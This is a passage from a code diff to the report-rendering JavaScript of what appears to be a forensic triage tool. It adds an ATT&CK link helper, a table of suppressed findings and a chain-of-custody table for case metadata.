         (f.Entity?'<div class="ent">entity: '+esc(f.Entity)+(f.Host?'  ·  host: '+esc(f.Host):'')+(f.Time?'  ·  '+esc(new Date(f.Time).toLocaleString()):'')+'</div>':'')+
         evidence(f.Evidence)+
@@ -768,7 +712,7 @@ kbd{font-family:var(--mono);font-size:.82em;background:var(--card2);border:1px s
   // ATT&CK
   var bt={};(D.coverage||[]).forEach(function(t){var k=t.Tactic||'Other';(bt[k]=bt[k]||[]).push(t);});
   var tk=Object.keys(bt).sort(),mx=el('matrix');
-  mx.innerHTML=tk.length?tk.map(function(k){return '<div class="at"><h4>'+esc(k)+'</h4>'+bt[k].map(function(t){return '<a href="'+au(t.Id)+'" target="_blank" rel="noopener"><b>'+esc(t.Id)+'</b> '+esc(t.Name||'')+'</a>';}).join('')+'</div>';}).join(''):'<div class="empty">No techniques observed.</div>';
+  mx.innerHTML=tk.length?tk.map(function(k){return '<div class="at"><h4>'+esc(k)+'</h4>'+bt[k].map(function(t){return tlink(t.Id,'<b>'+esc(t.Id)+'</b> '+esc(t.Name||''));}).join('')+'</div>';}).join(''):'<div class="empty">No techniques observed.</div>';
 
   // timeline
   var timed=F.filter(function(f){return f.Time;}).sort(function(a,b){return new Date(a.Time)-new Date(b.Time);});
@@ -780,6 +724,15 @@ kbd{font-family:var(--mono);font-size:.82em;background:var(--card2);border:1px s
   // gaps
   var g=D.gaps||[];
   el('gapwrap').innerHTML=g.length?g.map(function(x){return '<div class="gap"><b>'+esc(x.Source)+'</b> &mdash; '+esc(x.Reason)+(x.Fix?'<div class="fix">fix: '+esc(x.Fix)+'</div>':'')+'</div>';}).join(''):'<div class="note"><span class="n">ok</span><div>No collection gaps recorded — the triage ran with the visibility it attempted.</div></div>';
+
+  var sp=D.suppressed||[];
+  el('suppwrap').innerHTML=sp.length?'<table class="kv">'+sp.map(function(x){return '<tr><td class="k">'+esc(x.Severity)+' · '+esc(x.Id)+'</td><td class="v">'+esc(x.Title)+'<br><span style="color:var(--dim)">reason: '+esc(x.Reason||'(none given)')+' · rule: '+esc(x.Rule)+'</span></td></tr>';}).join('')+'</table>':'<div class="note"><span class="n">—</span><div>Nothing was suppressed.</div></div>';
+  var cs=D.case||{}, hs=D.host||{};
+  var crow=function(k,v){return (v===undefined||v===null||v==='')?'':'<tr><td class="k">'+esc(k)+'</td><td class="v">'+esc(typeof v==='object'?JSON.stringify(v):v)+'</td></tr>';};
+  el('custwrap').innerHTML='<table class="kv">'+crow('Case id',cs.Id)+crow('Mode',cs.Mode)+crow('Collected (UTC)',D.collected)+crow('Case started (UTC)',cs.Started)+crow('Report generated (UTC)',D.generated)+
+    crow('Operator',(cs.Operator||'')+(cs.OperatorHost?' @ '+cs.OperatorHost:''))+crow('Elevated',cs.Admin)+crow('PowerShell',cs.PowerShell)+crow('Tool',D.tool)+
+    crow('Host OS',hs.Os)+crow('Host time zone',hs.TimeZone)+crow('Parameters',cs.Parameters)+crow('Sources',(cs.Sources||[]).map(function(s){return s.role+': '+s.path+' sha256='+s.sha256;}).join(' | '))+
+    crow('Output on evidence system drive',cs.OutputOnSystemDrive)+'</table><div class="note"><span class="n">i</span><div>Every output file is hashed in manifest.json, written last. Record the manifest\'s own SHA-256 (printed at the end of the run) in your case notes to make the set tamper-evident. All times are UTC unless shown in your browser\'s local time.</div></div>';
 
   el('foot').innerHTML=esc(D.tool)+' · generated '+new Date(D.generated).toLocaleString()+' · read-only, self-contained. Risk = 1 − Π(1 − wᵢ/40): many low-confidence leads cannot sum to a critical. Keys: <kbd>/</kbd> search · <kbd>1</kbd>–<kbd>5</kbd> filter · <kbd>e</kbd>/<kbd>c</kbd> expand · <kbd>t</kbd> theme.';
 })();
